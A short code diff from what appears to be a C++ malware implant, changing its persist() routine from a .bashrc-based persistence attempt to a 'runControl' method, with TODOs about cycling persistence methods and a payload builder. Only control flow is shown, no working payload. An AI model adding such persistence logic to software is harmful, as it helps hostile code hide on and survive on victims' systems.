@@ -53,9 +53,7 @@ public:
     void persist() {
         // TOOD: chose from different persistence methods/try them one-by-one
         // TODO: parametrize for builder
-        LOG_INFO("[PERSISTENCE] Trying .bashrc...")
-        if (Persistence::bashrc() == 0) {
-            LOG_SUCCESS("Persistence established")
+        if (Persistence::runControl() == 0) {
             return;
         }
 
